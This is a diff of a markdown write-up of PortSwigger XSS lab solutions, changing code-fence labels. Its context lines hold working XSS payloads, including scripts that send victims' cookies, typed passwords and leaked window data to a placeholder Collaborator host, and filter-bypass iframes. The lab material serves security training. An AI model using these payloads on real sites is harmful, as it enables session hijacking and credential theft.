@@ -10,7 +10,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 1. Copy and paste into the search box:
 
-```html
+```text
 <script>alert(1)</script>
 ```
 
@@ -32,7 +32,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 1. Enter the following into the comment box:
 
-```html
+```text
 <script>alert('Hello World')</script>
 ```
 
@@ -62,7 +62,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 3. Break out of the `img` attribute:
 
-```html
+```text
 "><script>alert('Hello World')</script>
 ```
 
@@ -82,7 +82,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 1. If there is a query in the `location.search` variable (the URL input), `document.getElementById` gets the element with ID `searchMessage`. Then it will set its `innerHTML` to the query. Enter into the search box: 
 
-```html
+```text
 <img src=x onerror=alert(1)>
 ```
 
@@ -104,7 +104,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 2. Right-click and inspect the element, and observe that your random string has been placed inside an `a href` attribute.
 3. Change returnPath to:
 
-```html
+```text
 javascript:alert(document.cookie)
 ```
 
@@ -128,7 +128,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 1. Notice the vulnerable code on the home page using Burp or the browser's DevTools. 
 
-```html
+```text
 <script>
     $(window).on('hashchange', function(){
         var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
@@ -141,7 +141,7 @@ A [Jquery hashchange](https://github.com/apopelo/jquery-hashchange) event tracks
 
 2. Create exploit:
 
-```html
+```text
 <iframe src="https://lab-id.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print(1)>'">
 ```
 
@@ -170,7 +170,7 @@ Also see the leads from HackTricks concerning [XSS methodology](https://book.hac
 2. The random string has been reflected inside a quoted attribute.
 3. Replace the input with a payload to escape the quoted attribute and inject an event handler:
 
-```html
+```text
 " autofocus onfocus=alert(1) x="
 ```
 
@@ -180,7 +180,7 @@ Also see the leads from HackTricks concerning [XSS methodology](https://book.hac
 
 The resulting HTML:
 
-```html
+```text
 <section class=blog-header>
     <h1>0 search results for '&quot; autofocus onfocus=alert(1) x=&quot;'</h1>
     <hr>
@@ -202,7 +202,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 3. The random string in the second Repeater tab has been reflected inside an anchor `href` attribute.
 4. Repeat the process again, replacing the input with a payload to inject a JavaScript URL that calls alert:
 
-```html
+```text
 javascript:alert(1)
 ```
 
@@ -222,7 +222,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 1. Put a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
 
-```html
+```text
 <script>
     var searchTerms = '&lt;alphanumeric';
     document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
@@ -232,7 +232,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 2. The random string has been reflected inside a JavaScript string: The script accepts input, assigns it to the variable `searchTerms`, and does a `document.write` with the encoded URL using `encodeURIComponent`.
 3. Replace the input with this payload to break out of the JavaScript string and inject an alert:
  
-```html
+```text
 '-alert('XSS')-'
 ```
 
@@ -274,7 +274,7 @@ AngularJS is a popular JavaScript library, which scans the contents of HTML node
 2. View the page source and observe that your random string is enclosed in an `ng-app` directive.
 3. Enter the following AngularJS expression in the search box:
 
-```html
+```text
 {{$on.constructor('alert(1)')()}}
 ```
 
@@ -298,7 +298,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 6. Experiment with different search strings. The JSON response is escaping quotation marks. And backslash is not being escaped.
 7. Inject:
 
-```html
+```text
 \"-alert(1)}//
 ```
     
@@ -306,7 +306,7 @@ When the JSON response attempts to escape the opening double-quotes character, i
 
 An arithmetic operator (in this case the subtraction operator) is then used to separate the expressions before the alert() function is called. Finally, a closing curly bracket and two forward slashes close the JSON object early and comment out what would have been the rest of the object. As a result, the response is generated:
 
-```html
+```text
 {"searchTerm":"\\"-alert(1)}//", "results":[]} 
 ```
 
@@ -340,7 +340,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 2. Click **Copy to clipboard** to copy a unique Burp Collaborator payload to your clipboard.
 3. Submit the payload in a blog comment, inserting your Burp Collaborator subdomain where indicated. This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.
 
-```html
+```text
 <script>
     fetch('https://burp-collab-subdomain', {
     method: 'POST',
@@ -374,7 +374,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
 3. Enter the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
 
-```html
+```text
 <input name=username id=username>
 <input type=password name=password onchange="if(this.value.length)fetch('https://burp-collab-subdomain',{
 method:'POST',
@@ -413,7 +413,7 @@ This means your exploit will need to load the user account page, extract the CSR
 
 3. Enter the following payload in a blog comment:
 
-```html
+```text
 <script>
     var req = new XMLHttpRequest();
     req.onload = handleResponse;
@@ -442,7 +442,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 1. Inject a standard XSS vector, such as:
 
-```html
+```text
 <img src=1 onerror=print()>
 ```
 
@@ -465,7 +465,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 13. When the attack is finished, review the results. Note that all payloads caused an HTTP `400` response, except for the `onresize` payload, which caused a `200` response. 
 14. Go to the exploit server and paste the following code, replacing `lab-id` with your lab ID:
  
-```html
+```text
 <iframe src="https://lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
 ```
 
@@ -483,7 +483,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 1. Go to the exploit server and paste the following code, replacing `lab-id` with your lab ID:
  
-```html
+```text
 <script>
     location = 'https://lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
 </script>
@@ -505,7 +505,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 1. Inject a standard XSS payload:
 
-```html
+```text
 <img src=1 onerror=alert(1)>
 ```
 
@@ -576,7 +576,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 3. Try sending the payload `test'payload` and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.
 4. Replace the input with the following payload to break out of the script block and inject a new script:
 
-```html
+```text
 </script><script>alert(1)</script>
 ```
     
@@ -598,7 +598,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 4. Try sending the payload `test\payload` and note the backslash does not get escaped.
 5. Replace the input with the following payload to break out of the JavaScript string and inject an alert:
 
-```html
+```text
 \'-alert(1)//
 ```
     
@@ -619,7 +619,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 3. Note the random string in the second Repeater tab has been reflected inside an `onclick` event handler attribute.
 4. Repeat the process again but this time modify your input to inject a JavaScript URL that calls alert, using the following payload:
 
-```html
+```text
 http://foo?&apos;-alert(1)-&apos;
 ```
 
@@ -639,7 +639,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 2. Note the random string has been reflected inside a JavaScript template string.
 3. Replace the input with the following payload to execute JavaScript inside the template string:
 
-```html
+```text
 ${alert(1)}
 ```
 
@@ -713,7 +713,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 1. Go to the exploit server and paste the following code, replacing `lab-id` with your lab ID:
 
-```html
+```text
 <script>
 location='https://lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
 </script>
@@ -741,7 +741,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 4. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
 5. Back in the lab, go to the exploit server and add the following code, replacing `lab-id` and `exploit-server-id` with your lab ID and exploit server ID respectively, and replacing `collaborator-id` with the payload just copied from Burp Collaborator.
 
-```html
+```text
 <script>
 if(window.name) {
     new Image().src='//burp-collab-subdomain?'+encodeURIComponent(window.name);
@@ -778,7 +778,7 @@ The website in [this lab](https://portswigger.net/web-security/cross-site-script
 
 1. Enter the following into the search box:
 
-```html
+```text
 <img src=1 onerror=alert(1)>
 ```
 
